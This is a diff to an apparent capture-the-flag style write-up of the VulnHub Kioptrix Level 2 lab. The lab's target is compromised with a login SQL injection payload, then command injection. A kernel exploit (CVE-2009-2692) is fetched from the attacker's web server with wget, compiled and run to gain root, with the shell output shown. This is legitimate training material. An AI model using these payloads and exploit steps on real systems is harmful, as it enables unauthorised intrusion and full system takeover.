@@ -145,11 +145,13 @@ Performed SQLi and it worked with the classic payload with the below details.
 # 2) Exploitation
 
 ## Exploit Attempt:
-- Service/Vector: Login Page / Mysql DB
-- Exploit Name: SQLi
+- Service/Vector: Login Page
+- Exploits: SQLi & Command Injection
 - Source: http://192.168.11.102
 - Payload: `' or 1=1 #`
-  
+
+The SQL injection was performed at the web application level and not directly against the MySQL service (3306).
+
 ### Action
 
 - Payload: `' or 1=1 #'
@@ -168,7 +170,7 @@ Performed SQLi and it worked with the classic payload with the below details.
   I tried my IP and got the below:
   <img width="900" height="314" alt="image" src="https://github.com/user-attachments/assets/a8623608-08e9-401c-9ed0-584730f78e78" />
 - This result similar to terminal results. so our next action to to try to inject a command, we can try **pwd**, i used **semicolon** to make sure seprating the server behavoiur and my command.
-- Payload: ~; pwd`
+- Payload: `; pwd`
   <img width="894" height="222" alt="image" src="https://github.com/user-attachments/assets/06114848-5e3d-44d1-89da-1f3e709b8a2a" />
 - It's working, now time to remote the server by perfroming reverse shell, ref#1 cheat sheet has many ways to achieve this, i used the below:
   ```bash
@@ -189,13 +191,127 @@ We are inside the server! Next action is to escalate the user privilege.
 
 ---
 
-## Privilege Escalation
+## 3) Privilege Escalation
 
-- To be continued...
+## Enumeration
+**Goal**: Identify privilege escalation vectors
+**Tools**: manual
+
+### Commands for Manual Enumeration
+
+```bash
+bash-3.00$ whoami
+apache
+bash-3.00$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-3.00$ uname -a
+Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
+bash-3.00$ lsb_release -a
+LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
+Distributor ID: CentOS
+Description:    CentOS release 4.5 (Final)
+Release:        4.5
+Codename:       Final
+```
+
+### Findings
+```markdown
+	- Kernel version: 2.6.9-55
+	- CentOS release 4.5 (Final)
+```
+
+searchsploit for this version:
+
+```bash
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
+└─$ searchsploit Kernel 2.6 CentOS Privilege
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/1 | linux/local/9545.c
+Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4  | linux/local/9479.c
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4 | linux_x86/local/9542.c
+Linux Kernel 2.6.32 < 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege  | linux/local/25444.c
+Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - | linux_x86-64/local/45516.c
+------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+```
+
+This exploit looks matching: Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4  | linux/local/9479.c
+
+### Exploit Process
+
+I have downladed the exploit, then activated my web server that i will use to downlaod the exploit on the target machine, after download i compiled the exploit and executed with a result of root access.
+
+Full steps are below:
+
+On my machine:
+```bash
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
+└─$ searchsploit -m linux/local/9479.c
+  Exploit: Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5)
+      URL: https://www.exploit-db.com/exploits/9479
+     Path: /usr/share/exploitdb/exploits/linux/local/9479.c
+    Codes: CVE-2009-2692, OSVDB-56992
+ Verified: True
+File Type: C source, ASCII text
+Copied to: /home/kali/Desktop/Labs_Notes/VulnHub/Kioptrix_L2/9479.c
+    
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
+└─$ ls
+9479.c  full_scan_192.168.11.102  network_discovery
+  
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
+└─$ mv 9479.c prev_esc_orig.c 
+
+┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
+└─$ sudo cp prev_esc_orig.c /var/www/html/file
+```
+
+On target machine:
+```bash
+bash-3.00$ cd /tmp
+bash-3.00$ wget http://192.168.11.100/file/prev_esc_orig.c
+--11:53:44--  http://192.168.11.100/file/prev_esc_orig.c
+           => `prev_esc_orig.c'
+Connecting to 192.168.11.100:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2,535 (2.5K) [text/x-csrc]
+
+    0K ..                                                    100%  185.97 MB/s
+
+11:53:44 (185.97 MB/s) - `prev_esc_orig.c' saved [2535/2535]
+
+bash-3.00$ ls
+prev_esc_orig.c
+bash-3.00$ gcc -o prev_esc_exp_01 prev_esc_orig.c
+bash-3.00$ ./prev_esc_exp_01
+sh: no job control in this shell
+sh-3.00# whoami
+root
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+```
+
+Perfect! we have the **root** privilege.
+
+<img width="1406" height="619" alt="Level 1 1 (2)-5" src="https://github.com/user-attachments/assets/7eb203de-d42a-4534-95d2-582dfd7adee7" />
 
 ---
 
-## 🔗 References
+# 🏁 4) Proof & Flags
+Proof Files:
+
+- User Access:
+  <img width="1371" height="565" alt="Level 1 1 (2)-4" src="https://github.com/user-attachments/assets/634c37a8-8847-45e0-97d3-4f464faadc77" />
+
+- Root Access:
+  <img width="1406" height="619" alt="Level 1 1 (2)-5" src="https://github.com/user-attachments/assets/7eb203de-d42a-4534-95d2-582dfd7adee7" />
+
+---
+
+# 🔗 References
 
 - **ref#1**: https://www.invicti.com/learn/reverse-shell
 
